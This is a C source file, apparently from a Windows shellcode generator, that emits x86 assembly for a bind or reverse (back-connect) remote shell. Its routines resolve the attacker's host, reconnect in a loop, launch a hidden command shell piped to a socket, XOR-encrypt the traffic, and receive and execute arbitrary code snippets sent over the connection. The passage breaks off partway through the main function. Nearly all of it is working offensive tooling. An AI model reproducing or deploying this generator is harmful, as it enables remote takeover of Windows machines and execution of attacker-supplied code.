  M_push_v(ctx,ctx->x_wp2,ctx->v_wp2,";pipe");
  if (ctx->opt->USE_LASTCALL)
    add(ctx,"FFD6|call esi;ESI==last called api");
  else
    callK32(ctx,"CloseHandle");
  M_mov_v_ebx(ctx,ctx->x_wp2,ctx->v_wp2,"");

} // M_KILL_SHELL

void M_SEH(struct SHGE_CONTEXT* ctx, char* tmplabel, char* handler)
{

  add(ctx,";install seh, on error goto %s", handler);

  add(ctx,"call %s",tmplabel);
  add(ctx,"59|pop ecx");
  add(ctx,"59|pop ecx");
  add(ctx,"5C|pop esp");
  add(ctx,"33DB|xor ebx,ebx");
  if (ctx->opt->SYNTAX==0)
    add(ctx,"648F03|pop dword ptr fs:[ebx]");
  else
    add(ctx,"648F03|pop dword [fs:ebx]");
  add(ctx,"59|pop ecx;free");
  add(ctx,"jmp %s",handler);
  add(ctx,"%s:",tmplabel);
  if (ctx->opt->SYNTAX==0)
  {
    add(ctx,"64FF33|push dword ptr fs:[ebx]");
    add(ctx,"648923|mov fs:[ebx],esp");
  }
  else
  {
    add(ctx,"64FF33|push dword [fs:ebx]");
    add(ctx,"648923|mov [fs:ebx],esp");
  }


} // M_SEH

void M_MUTEX(struct SHGE_CONTEXT* ctx)
{
  add(ctx,";check mutex");

  if (ctx->opt->USE_XPUSH_STRINGS)
  {
    X_PUSH(ctx,ctx->opt->str_mutex,1);
    add(ctx,"54|push esp;ptr to mutex name");
  }
  else // !USE_XPUSH_STRINGS
  {
    add(ctx,"call %s", ctx->l___mtx_pushed__);
    X_DB(ctx,ctx->opt->str_mutex,1);
    add(ctx,"%s:", ctx->l___mtx_pushed__);
  } // !USE_XPUSH_STRINGS

  add(ctx,"6A01|push 1;initial ownership");
  add(ctx,"53|push ebx;0");
  callK32(ctx,"CreateMutexA");

  if (ctx->opt->USE_XPUSH_STRINGS)
  {
    X_POP_KEEPFLAGS(ctx);
  }

  if (ctx->opt->DIRECT_API)
    add(ctx,"09C0|or eax,eax;check if error");
  add(ctx,"jz %s", ctx->l___mtx_start__);

  add(ctx,"93|xchg ebx,eax");

  callK32(ctx,"GetLastError");
  add(ctx,"3CB7|cmp al,183;ERROR_ALREADY_EXISTS");
  add(ctx,"jne %s", ctx->l___mtx_start__);

  add(ctx,"6AFF|push -1;INFINITE");
  add(ctx,"53|push ebx;mutex handle");
  callK32(ctx,"WaitForSingleObject");
  add(ctx,";WAIT_OBJECT_0=0 WAIT_TIMEOUT=258 WAIT_ABANDONED=128 WAIT_FAILED=-1");

  add(ctx,"%s:", ctx->l___mtx_start__);
  add(ctx,"33DB|xor ebx,ebx");

} // M_MUTEX

void M_SETSOCKOPT(struct SHGE_CONTEXT* ctx)
{
  add(ctx,";setsockopt(SO_REUSEADDR)");

  add(ctx,"6A01|push 1;alloc DWORD");
  add(ctx,"8BCC|mov ecx,esp");
  add(ctx,"6A04|push 4;optlen");
  add(ctx,"51|push ecx;char* optval");
  add(ctx,"6A04|push 4;SO_REUSEADDR");
  add(ctx,"68FFFF0000|push %s;SOL_SOCKET",hex_num(ctx,0x0000FFFF,8));
  M_push_v(ctx,ctx->x_listen_socket,ctx->v_listen_socket,";socket");
  callWS2(ctx,"setsockopt");
  add(ctx,"59|pop ecx;free");
} // M_SETSOCKOPT

void M_alloc_sa_incp(struct SHGE_CONTEXT* ctx, char* error_label, char* temp_label)
{
  char t[32];

  if (ctx->opt->BACKCONNECT && ctx->opt->BC2HOST)
  {
    add_struct(ctx, "resolve hostname --> ip;");

    add(ctx,";resolve IP by hostname, on error goto %s", error_label);

//add(ctx,"CC|int 3");

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_PUSH(ctx,ctx->opt->str_host,1);
      add(ctx,"54|push esp;ptr to host name");
    }
    else // !USE_XPUSH_STRINGS
    {
      add(ctx,"call %s;ptr to hostname",temp_label);
      X_DB(ctx,ctx->opt->str_host,1);
      add(ctx,"%s:",temp_label);
    } // !USE_XPUSH_STRINGS

    callWS2(ctx,"gethostbyname");

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_POP_KEEPFLAGS(ctx);
    } // !USE_XPUSH_STRINGS

    if (ctx->opt->DIRECT_API)
      add(ctx,"09C0|or eax,eax;check if error");
    add(ctx,"jz %s", error_label);

    add(ctx,";EAX = struct hostent*");
    add(ctx,"8B400C|mov eax,[eax+12];EAX=h_addr_list");
    add(ctx,"8B08|mov ecx,[eax];ECX=h_addr_list[0]");
    add(ctx,"8B09|mov ecx,[ecx];ECX=IP");

  } // if (BACKCONNECT && BC2HOST)

  add_struct(ctx, "initialize sockaddr_in;");

  add(ctx,";alloc struct sockaddr_in (push in reversed dwordorder)");
  add(ctx,"53|push ebx;0");
  add(ctx,"53|push ebx;0");

  if (ctx->opt->BACKCONNECT && ctx->opt->BC2HOST)
  {
    add(ctx,"51|push ecx;resolved IP");
  }
  else
  {
    if (ctx->opt->IP_ADDR == 0)
      add(ctx,"53|push ebx;IP==0");
    else
      add(ctx,"68%08X|push %s;IP",DD(ctx->opt->IP_ADDR),ctx->c_IP_ADDR);
  }

  strcpy(t, hex_num(ctx,0x00FF,4));
  if (ctx->opt->SYNTAX == 0)
  {
    add(ctx,"68%08X|push (%s and %s) shl 24 + ((%s and %s) shl 8) + 2;2=AF_INET",
      DD( ((ctx->opt->SHELL_PORT&0x00ff)<<24) + ((ctx->opt->SHELL_PORT&0xff00)<<8) + 2 ),
      ctx->c_SHELL_PORT,
      t,
      ctx->c_SHELL_PORT,
      hex_num(ctx,0xFF00,4) );
  }
  else
  {
    add(ctx,"68%08X|push ((%s & %s) << 24) + ((%s & %s) << 8) + 2;2=AF_INET",
      DD( ((ctx->opt->SHELL_PORT&0x00ff)<<24) + ((ctx->opt->SHELL_PORT&0xff00)<<8) + 2 ),
      ctx->c_SHELL_PORT,
      t,
      ctx->c_SHELL_PORT,
      hex_num(ctx,0xFF00,4) );
  }

  if (ctx->opt->VAR_PORT)
  {
    add(ctx,"call %s", ctx->l___varp_pop__);
    add(ctx,"%s:", ctx->l___varp_pop__);
    add(ctx,"58|pop eax");
    add(ctx,"FE40FA|inc $BP [eax-5-1]");
  }

  add(ctx,"8BCC|mov ecx,esp;ecx = struct sockaddr");

} // M_alloc_sa_incp

void M_BIND_LISTEN(struct SHGE_CONTEXT* ctx, char* error_label, char* temp_label)
{
  M_alloc_sa_incp(ctx, error_label, temp_label);

  add_struct(ctx, "bind to ip:port;");
  if (ctx->opt->VAR_PORT)
    add_struct(ctx, "self-patch: change port (for the future);");
  add_struct(ctx, "listen for incoming connections;");

  add(ctx,";bind && listen, on error goto %s", error_label);

  add(ctx,"6A10|push 16;sizeof(struct sockaddr)");
  add(ctx,"51|push ecx;struct sockaddr");
  M_push_v(ctx,ctx->x_listen_socket,ctx->v_listen_socket,";socket");
  callWS2(ctx,"bind");

  add(ctx,";free 16 bytes");
  add(ctx,"59|pop ecx");
  add(ctx,"59|pop ecx");
  add(ctx,"59|pop ecx");
  add(ctx,"59|pop ecx");

  if (ctx->opt->DIRECT_API)
    add(ctx,"09C0|or eax,eax;check if error");
  add(ctx,"jnz %s", error_label);

  add(ctx,"6A7F|push 127;backlog");
  M_push_v(ctx,ctx->x_listen_socket,ctx->v_listen_socket,";socket");
  callWS2(ctx,"listen");

  if (ctx->opt->DIRECT_API)
    add(ctx,"09C0|or eax,eax;check if error");
  add(ctx,"jnz %s", error_label);

} // M_BIND_LISTEN

void M_ACCEPT(struct SHGE_CONTEXT* ctx, char* error_label)
{

  add(ctx,";accept, on error goto %s", error_label);

  add(ctx,"53|push ebx;0");
  add(ctx,"53|push ebx;0");
  M_push_v(ctx,ctx->x_listen_socket,ctx->v_listen_socket,";socket");
  callWS2(ctx,"accept");

  M_mov_v_eax(ctx,ctx->x_io_socket,ctx->v_io_socket,"");

  if (ctx->opt->DIRECT_API)
    add(ctx,"09C0|or eax,eax;check if error");
  add(ctx,"jle %s;check if 0 or -1==INVALID_SOCKET", error_label);

} // M_ACCEPT

void M_CREATE_THREAD(struct SHGE_CONTEXT* ctx, char* thread_func)
{
  add(ctx,";create thread, thread func = %s", thread_func);

  add(ctx,"53|push ebx;alloc TID");
  add(ctx,"54|push esp;lpThreadId");
  add(ctx,"53|push ebx;dwCreationFlags");
  M_push_v(ctx,ctx->x_io_socket,ctx->v_io_socket,";lpParameter");
  add(ctx,"call %s", ctx->l___pop_th__);
  add(ctx,"jmp %s", thread_func);
  add(ctx,"%s:", ctx->l___pop_th__);
  add(ctx,"53|push ebx;dwStackSize");
  add(ctx,"53|push ebx;lpThreadAttributes");
  callK32(ctx,"CreateThread");
  add(ctx,"59|pop ecx;free");

  add(ctx,"50|push eax;thread handle");
  callK32(ctx,"CloseHandle");

} // M_CREATE_THREAD

void M_CONNECT(struct SHGE_CONTEXT* ctx, char* temp_label)
{
  add(ctx,";connect");

  add(ctx,"%s:", ctx->l___reconnect__);

  M_alloc_sa_incp(ctx, ctx->l___conn_fault__, temp_label);

  if (ctx->opt->VAR_PORT)
    add_struct(ctx, "self-patch: change port (for the future connections);");
  add_struct(ctx, "connect to ip;");

  add(ctx,"6A10|push 16;sizeof(struct sockaddr)");
  add(ctx,"51|push ecx;struct sockaddr");
  M_push_v(ctx, ctx->x_io_socket, ctx->v_io_socket, ";socket");
  callWS2(ctx,"connect");

  add(ctx,"59|pop ecx;free");
  add(ctx,"59|pop ecx;free");
  add(ctx,"59|pop ecx;free");
  add(ctx,"59|pop ecx;free");

  if (ctx->opt->DIRECT_API)
    add(ctx,"09C0|or eax,eax;check if error");
  add(ctx,"jz %s", ctx->l___connected__);

  add(ctx,"%s:", ctx->l___conn_fault__);

  if (ctx->opt->RECONNECT_MS != 0)
  {
    add_struct(ctx,"if cant connect, pause && retry;");

    add(ctx,"68%08X|push %s",DD(ctx->opt->RECONNECT_MS),ctx->c_RECONNECT_MS);
    callK32(ctx,"Sleep");
  }

  add(ctx,"jmp %s", ctx->l___reconnect__);
  add(ctx,"%s:", ctx->l___connected__);

} // M_CONNECT

void M_CREATE_PIPE_real(struct SHGE_CONTEXT* ctx)
{
  add(ctx,";alloc s.a. (reversed dwordorder)");
  add(ctx,"6A01|push 1;inherit handles");
  add(ctx,"53|push ebx;lpSecurityDescriptor=NULL");
  add(ctx,"6A0C|push 12;sizeof(sa)");
  add(ctx,"8BD4|mov edx,esp;ptr to SECURITY_ATTRIBUTES");

  add(ctx,"53|push ebx;nSize=0");
  add(ctx,"52|push edx;security attributes");
  add(ctx,"50|push eax;w");
  add(ctx,"51|push ecx;r");
  callK32(ctx,"CreatePipe");

  add(ctx,"59|pop ecx;free");
  add(ctx,"59|pop ecx;free");
  add(ctx,"59|pop ecx;free");

  if (ctx->opt->DIRECT_API)
    add(ctx,"09C0|or eax,eax;check if error");
} // M_CREATE_PIPE_real

void M_CREATE_PIPE(struct SHGE_CONTEXT* ctx, int npass, char*wp_str, int v_wp, char* rp_str, int v_rp, char* error_label)
{
  if (ctx->opt->SUB_CREATEPIPE == 0)
  {
    if (npass==0)
    {
      add(ctx,";create pipe pair, read pipe = %s, write pipe = %s", rp_str, wp_str);

      M_lea_eax_v(ctx,wp_str,v_wp,"");

      if (v_rp > 128)
        add(ctx,"8D8D%08X|lea ecx,[ebp-%s]",DD(-v_rp),rp_str);
      else
        add(ctx,"8D4D%02X|lea ecx,[ebp-%s]",DB(-v_rp),rp_str);

      M_CREATE_PIPE_real(ctx);

      add(ctx,"jz %s", error_label);
    }
  }
  else // SUB_CREATEPIPE
  {
    if (npass == 0)
    {
      add(ctx,";create pipe pair, read pipe = %s, write pipe = %s", rp_str, wp_str);

      M_lea_eax_v(ctx,wp_str,v_wp,"");

      if (v_rp > 128)
        add(ctx,"8D8D%08X|lea ecx,[ebp-%s]",DD(-v_rp),rp_str);
      else
        add(ctx,"8D4D%02X|lea ecx,[ebp-%s]",DB(-v_rp),rp_str);

      add(ctx,"call %s", ctx->l___create_pipe__);

      add(ctx,"jz %s", error_label);

    }
    else // npass==1
    {
      add_struct(ctx,"create_pipe();");

      add(ctx,"%s:", ctx->l___create_pipe__);

      M_CREATE_PIPE_real(ctx);

      add(ctx,"C3|retn");

    }
  } // SUB_CREATEPIPE

} // M_CREATE_PIPE

void M_RUN_SHELL(struct SHGE_CONTEXT* ctx, char* error_label)
{
  int i, sz1, sz2;

  //add(ctx,"CC|int 3");

  M_CREATE_PIPE(ctx, 0, ctx->x_wp1, ctx->v_wp1, ctx->x_rp1, ctx->v_rp1, error_label);
  M_CREATE_PIPE(ctx, 0, ctx->x_wp2, ctx->v_wp2, ctx->x_rp2, ctx->v_rp2, error_label);

  add(ctx, ";alloc startupinfo (reversed dwordorder)");

  M_push_v(ctx,ctx->x_wp2,ctx->v_wp2,";stderr");
  M_push_v(ctx,ctx->x_wp2,ctx->v_wp2,";stdout");
  M_push_v(ctx,ctx->x_rp1,ctx->v_rp1,";stdin");
  add(ctx,"53|push ebx");
  add(ctx,"53|push ebx;1st WORD = 0 = SW_HIDE");
  add(ctx,"6801010000|push 257;STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES");
  add(ctx,"6A0A|push 10");
  add(ctx,"59|pop ecx");
  add(ctx,"%s:;0x00 x 40", ctx->l___si_fill_cycle__);
  add(ctx,"53|push ebx");
//  add(ctx,"49|dec ecx");
//  add(ctx,"jnz %s", ctx->l___si_fill_cycle__);
  add(ctx,"loop %s", ctx->l___si_fill_cycle__);
  add(ctx,"6A44|push 68;sizeof(_STARTUPINFO)");

  add(ctx, ";alloc cmdline");

  if (ctx->opt->SUPPORT_WIN9X)
  {

    callK32(ctx,"GetVersion");
    add(ctx,"8BD4|mov edx,esp;ptr to _STARTUPINFO");

    if (ctx->opt->DIRECT_API)
      add(ctx,"09C0|or eax,eax;check if error");
    add(ctx,"js %s", ctx->l___rs_win9X__);

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      sz1 = strlen(ctx->opt->str_cmd);
      sz2 = strlen(ctx->opt->str_command);
      sz1 = ((sz1+1+3)&(~3));
      sz2 = ((sz2+1+3)&(~3));

      for(i=sz1; i<sz2; i+=4)
        add(ctx,"53|push ebx;make both pushed sizes equal");
      X_PUSH(ctx, ctx->opt->str_cmd,1);

      add(ctx,"jmp %s", ctx->l___rs_pushed__);
      add(ctx,"%s:", ctx->l___rs_win9X__);

      for(i=sz2; i<sz1; i+=4)
        add(ctx,"53|push ebx;make both pushed sizes equal");
      X_PUSH(ctx, ctx->opt->str_command,1);

      add(ctx,"%s:", ctx->l___rs_pushed__);
      add(ctx,"8BCC|mov ecx,esp;ecx=shell name");

      ctx->x_size = MAX(sz1,sz2);
    }
    else //!USE_XPUSH_STRINGS
    {
      ctx->x_size = 0; // for X_POP()
      add(ctx,"call %s", ctx->l___rs_pushed__);
      X_DB(ctx, ctx->opt->str_cmd,1);
      add(ctx,"%s:", ctx->l___rs_win9X__);
      add(ctx,"call %s", ctx->l___rs_pushed__);
      X_DB(ctx, ctx->opt->str_command,1);
      add(ctx,"%s:", ctx->l___rs_pushed__);
      add(ctx,"59|pop ecx;ecx = shell name");
    } // !USE_XPUSH_STRINGS
  }
  else // !SUPPORT_WIN9X
  {
    add(ctx,"8BD4|mov edx,esp;ptr to _STARTUPINFO");
    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_PUSH(ctx,ctx->opt->str_cmd,1);
      add(ctx,"8BCC|mov ecx,esp;ecx=shell name");
    }
    else // !USE_XPUSH_STRINGS
    {
      ctx->x_size = 0; // for X_POP()
      add(ctx,"call %s", ctx->l___rs_pushed__);
      X_DB(ctx,ctx->opt->str_cmd,1);
      add(ctx,"%s:", ctx->l___rs_pushed__);
      add(ctx,"59|pop ecx;ecx = shell name");
    } //!USE_XPUSH_STRINGS
  }

  add(ctx,";exec shell");

  M_lea_eax_v(ctx,ctx->x_processinfo,ctx->v_processinfo,"");
  add(ctx,"50|push eax;-->processinfo");
  add(ctx,"52|push edx;-->startupinfo");
  add(ctx,"53|push ebx;0");
  add(ctx,"53|push ebx;0");
  add(ctx,"53|push ebx;0");
  add(ctx,"6A01|push 1;inherit handles");
  add(ctx,"53|push ebx;0");
  add(ctx,"53|push ebx;0");
  add(ctx,"51|push ecx;--> shell.exe");
  add(ctx,"53|push ebx;0");
  callK32(ctx,"CreateProcessA");

  ctx->x_size += 68; // += sizeof(struct _STARTUPINFO)
  X_POP_KEEPFLAGS(ctx);

  if (ctx->opt->DIRECT_API)
    add(ctx,"09C0|or eax,eax;check if error");
  add(ctx,"jz %s", error_label);

} // M_RUN_SHELL

void M_xorcycle(struct SHGE_CONTEXT* ctx, char* l1)
{
  add(ctx,"60|pushad");
  add(ctx,"%s:", l1);
  add(ctx,"8037%02X|xor $BP [edi],%s",ctx->opt->XORBYTE,ctx->c_XORBYTE);
  add(ctx,"47|inc edi");
  add(ctx,"48|dec eax");
  add(ctx,"jnz %s",l1);
  add(ctx,"61|popad");
} // M_xorcycle

void M_SHELL_CYCLE(struct SHGE_CONTEXT* ctx, char* end_shell, char* end_socket)
{
  int i;
  char s[256];

  sprintf(s,"%s+0", ctx->x_processinfo);

  add(ctx,";main shell io cycle");

  if (ctx->opt->INACT != 0)
  {
    add(ctx,";save time_0");
//add(ctx,"CC|int 3");
    add(ctx,"%s:",ctx->l___sh_cycle_save__);
    callK32(ctx,"GetTickCount");
    M_mov_v_eax(ctx,ctx->x_alive,ctx->v_alive,"");

    add_struct(ctx,"[7]");
    add_struct(ctx,"save current time;");
  }

  add_struct(ctx,"[6]");

  add(ctx,"%s:", ctx->l___sh_cycle__);

  if (!ctx->opt->NOSHELL)
  {
    add_struct(ctx,"if shell died, goto [4];");

    add(ctx,";check if shell died");

    add(ctx,"53|push ebx;alloc");

    add(ctx,"54|push esp;ptr to ExitCode");
    M_push_v(ctx,s,ctx->v_processinfo+0,";hProcess");
    callK32(ctx,"GetExitCodeProcess");

    if (ctx->opt->DIRECT_API)
      add(ctx,"09C0|or eax,eax;check if error");
    add(ctx,"58|pop eax;free, get EAX=ExitCode");
    add(ctx,"jz %s", end_shell);
    add(ctx,"663D0301|cmp ax,%s;STILL_ACTIVE ?",hex_num(ctx,0x103,0));
    add(ctx,"jne %s", end_shell);

    add_struct(ctx,"check shell pipe, if nothing to be read goto [8];");

    add(ctx,";check if shell pipe has something to be read");

    add(ctx,"53|push ebx;alloc");
    add(ctx,"8BCC|mov ecx,esp");
    add(ctx,"53|push ebx;0==bytesleftthismessage");
    add(ctx,"51|push ecx;totalbytesavail");
    add(ctx,"53|push ebx;0==bytesread");
    add(ctx,"53|push ebx;0==bufsize");
    add(ctx,"53|push ebx;0==io buf");
    M_push_v(ctx,ctx->x_rp2,ctx->v_rp2,";pipe");
    callK32(ctx,"PeekNamedPipe");

    add(ctx,"59|pop ecx;free, get ECX=totalbytesavail");

    if (ctx->opt->DIRECT_API)
      add(ctx,"09C0|or eax,eax;check if error");
    add(ctx,"jz %s", end_shell);

    add(ctx,"0BC9|or ecx,ecx");
    add(ctx,"jz %s", ctx->l___sh_readsocket__);

    add(ctx,";calc how many bytes can we read (not more than %s)", ctx->c_MAXBUFSIZE);

    add(ctx,"B8%08X|mov eax,%s",DD(ctx->opt->MAXBUFSIZE),ctx->c_MAXBUFSIZE);
    add(ctx,"3BC8|cmp ecx,eax");
    add(ctx,"jbe %s", ctx->l___sh_sizeok__);
    add(ctx,"91|xchg ecx,eax");

    add_struct(ctx,"read from shell pipe;");

    add(ctx,";read from pipe");

    add(ctx,"%s:", ctx->l___sh_sizeok__);
    add(ctx,"53|push ebx;alloc numread");
    add(ctx,"8BD4|mov edx,esp;ptr to numread");
    add(ctx,"53|push ebx;0");
    add(ctx,"52|push edx;ptr to numread");
    add(ctx,"51|push ecx;bufsize");
    add(ctx,"57|push edi;ptr to io buffer");
    M_push_v(ctx,ctx->x_rp2,ctx->v_rp2,";pipe");
    callK32(ctx,"ReadFile");

    if (ctx->opt->DIRECT_API)
      add(ctx,"09C0|or eax,eax;check if error");
    add(ctx,"58|pop eax;free, get EAX=numread");
    add(ctx,"jz %s", end_shell);

    if (ctx->opt->XORBYTE != 0)
    {
      add_struct(ctx,"encrypt data;");
      add(ctx,";encrypt data");
      M_xorcycle(ctx, ctx->l___xor_cycle_1__);
    }

    add_struct(ctx,"send to socket, on error goto [5];");
    add(ctx,";send to socket");

    add(ctx,"53|push ebx;0");
    add(ctx,"50|push eax;bufsize");
    add(ctx,"57|push edi;ptr to io buffer");
    M_push_v(ctx,ctx->x_io_socket,ctx->v_io_socket,"");
    callWS2(ctx,"send");
    add(ctx,"40|inc eax;SOCKET_ERROR?");
    add(ctx,"jz %s", end_socket);

    // 1.03 fix ++
    if (ctx->opt->INACT != 0)
    {
      add_struct(ctx,"goto [7];");
      // todo: if (ctx->opt->INACT_COUNTWRITE) {
      add(ctx,";back to shell cycle && save alive time");
      add(ctx,"jmp %s", ctx->l___sh_cycle_save__);
    }
    else
    {
      //add(ctx,"jmp %s", ctx->l___sh_cycle__);
    }
    // 1.03 fix --

  } // !NOSHELL

  add_struct(ctx,"[8]");
  add(ctx,"%s:", ctx->l___sh_readsocket__);

  if (ctx->opt->INACT != 0)
  {
    add_struct(ctx,"check inactivity timeout, on error goto [5];");

    add(ctx,";check if inactivity timeout");
//add(ctx,"CC|int 3");
    callK32(ctx,"GetTickCount");
    M_sub_eax_v(ctx,ctx->x_alive,ctx->v_alive,"");

    if ((ctx->opt->INACT*1000) <= 127)
      add(ctx,"83F8%02X|cmp eax,%s*1000",DB(ctx->opt->INACT*1000),ctx->c_INACTIVITY);
    else
      add(ctx,"3D%08X|cmp eax,%s*1000",DD(ctx->opt->INACT*1000),ctx->c_INACTIVITY);

    add(ctx,"jg %s", end_socket);
  }

  add_struct(ctx,"check socket, if nothing to read goto [6];");

  add(ctx,";alloc,readfds (reversed dwordorder)");
  M_push_v(ctx,ctx->x_io_socket,ctx->v_io_socket,"");
  add(ctx,"6A01|push 1");
  add(ctx,"8BCC|mov ecx,esp");

  add(ctx,";alloc,timeout (reversed dwordorder)");
  add(ctx,"6A64|push 100;tv_usec");
  add(ctx,"53|push ebx;tv_sec==0");

  add(ctx,";check if something can be read from socket");

  add(ctx,"54|push esp;ptr to timeout");
  add(ctx,"53|push ebx;0=exceptfds");
  add(ctx,"53|push ebx;0=writefds");
  add(ctx,"51|push ecx;ptr to readfds");
  add(ctx,"53|push ebx;nfds=0=unused");
  callWS2(ctx, "select");

  add(ctx,"59|pop ecx;free");
  add(ctx,"59|pop ecx;free");
  add(ctx,"59|pop ecx;free");
  add(ctx,"59|pop ecx;free");

  add(ctx,"40|inc eax;-1=error?");
  add(ctx,"jz %s;0=timeout",end_socket);
  add(ctx,"48|dec eax");
  add(ctx,"jz %s;0=timeout", ctx->l___sh_cycle__);

  add_struct(ctx,"read from socket;");

  add(ctx,";recv from socket");

  add(ctx,"53|push ebx;flags==0");
  add(ctx,"68%08X|push %s",DD(ctx->opt->MAXBUFSIZE),ctx->c_MAXBUFSIZE);
  add(ctx,"57|push edi;ptr to io buffer");
  M_push_v(ctx,ctx->x_io_socket,ctx->v_io_socket,"");
  callWS2(ctx,"recv");

  if (ctx->opt->DIRECT_API)
    add(ctx,"09C0|or eax,eax;check if error");
  add(ctx,"jle %s;-1,0 --> %s", end_socket, end_socket);

  if (ctx->opt->XORBYTE != 0)
  {
    add_struct(ctx,"decrypt data;");
    add(ctx,";decrypt data");
    M_xorcycle(ctx, ctx->l___xor_cycle_2__);
  }

  if (ctx->opt->SNIPPET)
  {
    add_struct(ctx,"if <snippet_prefix> + <data_length>");
    add_struct(ctx,"{");

    add(ctx,";check if code snippet");

    i = strlen(ctx->opt->str_snippet);

    if ((i+4)>=128)
      add(ctx,"3D%08X|cmp eax,%d+4;check snippet prefix length + 4",DD(i+4),i);
    else
      add(ctx,"83F8%02X|cmp eax,%d+4;check snippet prefix length + 4",DB(i+4),i);
    add(ctx,"jnz %s", ctx->l___end_snippet_1__);

    add(ctx,"60|pushad");

    add(ctx,"8D48FC|lea ecx,[eax-4];ECX=strlen(snippet prefix)");

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_PUSH(ctx,ctx->opt->str_snippet,0);
      add(ctx,"8BF4|mov esi,esp;ESI=ptr to snippet prefix string");
    }
    else // !USE_XPUSH_STRINGS
    {
      add(ctx,"call %s;ptr to snippet prefix string",ctx->l___pop_snippet__);
      X_DB(ctx,ctx->opt->str_snippet,0);
      add(ctx,"%s:",ctx->l___pop_snippet__);
      add(ctx,"5E|pop esi");
    } // !USE_XPUSH_STRINGS

    add(ctx,";compare data");

    add(ctx,"F3A6|repz cmpsb;CLD in the INIT part");

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_POP_KEEPFLAGS(ctx);
    } // !USE_XPUSH_STRINGS

    add(ctx,"jnz %s", ctx->l___end_snippet_3__);

    add(ctx,"8B1F|mov ebx,[edi];EBX=snippet length (4 bytes after prefix string)");

    add(ctx,";allocate buffer");

    if (ctx->opt->ALLOC_BUF)
    {
      add(ctx,"53|push ebx;EBX=snippet length");
      add(ctx,"6A00|push 0");
      callK32(ctx,"GlobalAlloc");
      add(ctx,"97|xchg edi,eax;EDI=snippet buffer");
    }
    else
    {
      add(ctx,"2BE3|sub esp, ebx");
      add(ctx,"8BFC|mov edi, esp");
    }

    add_struct(ctx,"recv snippet body;");

    add(ctx,";recv <snippet_data> from socket");

    add(ctx,"60|pushad");
    add(ctx,"%s:", ctx->l___snippet_cycle__);

    add(ctx,"6A00|push 0;flags");
    add(ctx,"53|push ebx;snippet length (remaining)",DD(ctx->opt->MAXBUFSIZE),ctx->c_MAXBUFSIZE);
    add(ctx,"57|push edi;ptr to snippet data (+offs)");
    M_push_v(ctx,ctx->x_io_socket,ctx->v_io_socket,"");
    callWS2(ctx,"recv");

    if (ctx->opt->DIRECT_API)
      add(ctx,"09C0|or eax,eax;check if error");
    add(ctx,"jle %s", ctx->l___rcvd_snippet__);

    add(ctx,"03F8|add edi,eax");
    add(ctx,"2BD8|sub ebx,eax");
    add(ctx,"jnz %s", ctx->l___snippet_cycle__);

    add(ctx,"%s:", ctx->l___rcvd_snippet__);
    add(ctx,"09C0|or eax,eax;check if error");

    add(ctx,"61|popad");
    add(ctx,"jle %s", ctx->l___end_snippet_2__);

    add(ctx,";call snippet");

    add(ctx,"60|pushad");

//    if (ctx->opt->DIRECT_API)
//    {
//      add(ctx,"68%08X|push %s;[ESP+8]=ptr to kernel32::GetProcAddress",
//        ctx->opt->API_K32_GetProcAddress,
//        ctx->a_K32_GetProcAddress );
//    }
//    else
//    {
//      if (!ctx->opt->USE_LASTCALL)
//      {
//        add(ctx,"6A00|push 0;lastcall disabled --> [ESP+8]==0");
//      }
//      else
//      {
//        add(ctx,"6A00|push 0;ordinal 0");
//        M_push_v(ctx,ctx->x_ws2_base,ctx->v_ws2_base,";ws2_32 base");
//        callK32(ctx,"GetProcAddress");
//        add(ctx,"56|push esi;[ESP+8]=ptr to kernel32::GetProcAddress");
//      }
//    }
    add_struct(ctx,"exec snippet;");

    M_push_v(ctx,ctx->x_io_socket,ctx->v_io_socket,";[ESP+4]=io socket");
    add(ctx,"FFD7|call edi");
//    add(ctx,"59|pop ecx");
    add(ctx,"59|pop ecx");
    add(ctx,"61|popad");

    add(ctx,"%s:", ctx->l___end_snippet_2__);

    add(ctx,";free buffer");
    if (ctx->opt->ALLOC_BUF)
    {
      add(ctx,"57|push edi;ptr to allocated snippet buffer");
      callK32(ctx,"GlobalFree");
    }
    else
    {
      add(ctx,"03E3|add esp,ebx");
    }

    add(ctx,"61|popad");

    if (ctx->opt->INACT != 0)
    {
      add(ctx,";back to shell cycle && save alive time");
      add_struct(ctx,"goto [7]");
      add(ctx,"jmp %s", ctx->l___sh_cycle_save__);
    }
    else
    {
      add_struct(ctx,"goto [6]");
      add(ctx,"jmp %s", ctx->l___sh_cycle__);
    }

    add(ctx,"%s:", ctx->l___end_snippet_3__);

    add(ctx,"61|popad");

    add(ctx,"%s:", ctx->l___end_snippet_1__);

    add_struct(ctx,"}");

  } // SNIPPET

  if (!ctx->opt->NOSHELL)
  {
    add_struct(ctx,"write to shell pipe;");

    add(ctx,";send to shell");

    add(ctx,"53|push ebx;lpOverlapped==NULL");
    add(ctx,"54|push esp;ptr to numwritten(note if RETN)");
    add(ctx,"50|push eax;bufsize");
    add(ctx,"57|push edi;ptr to io buffer");
    M_push_v(ctx,ctx->x_wp1,ctx->v_wp1,";pipe handle");
    callK32(ctx,"WriteFile");

    if (ctx->opt->DIRECT_API)
      add(ctx,"09C0|or eax,eax;check if error");
    add(ctx,"jz %s", end_shell);

  } // !NOSHELL

  if (ctx->opt->INACT != 0)
  {
    add(ctx,";back to shell cycle && save alive time");
    add(ctx,"jmp %s", ctx->l___sh_cycle_save__);
    add_struct(ctx,"goto [7];");
  }
  else
  {
    add_struct(ctx,"goto [6];");
    add(ctx,"jmp %s", ctx->l___sh_cycle__);
  }

} // M_SHELL_CYCLE

void add_x(struct SHGE_CONTEXT* ctx, char* name, unsigned long addr, char* cmt)
{
  char s[256];
  strcpy(s, name+strlen(ctx->opt->a_prefix)+4);
  s[strlen(s)-strlen(ctx->opt->a_postfix)]=0;
  add_c(ctx, name, ctx->opt->DIRECT_API?addr:hash(ctx,s), cmt, 8);
} // add_x

void shge_main(struct SHGE_CONTEXT* ctx)
{
  char s[256];
  int i, delta;

  // alloc local vars

  add(ctx,";local variables");

  if (!ctx->opt->NOSHELL)
  {
    ctx->v_rp1              = add_v(ctx,ctx->x_rp1,"DWORD",4);
    ctx->v_wp1              = add_v(ctx,ctx->x_wp1,"DWORD",4);
    ctx->v_rp2              = add_v(ctx,ctx->x_rp2,"DWORD",4);
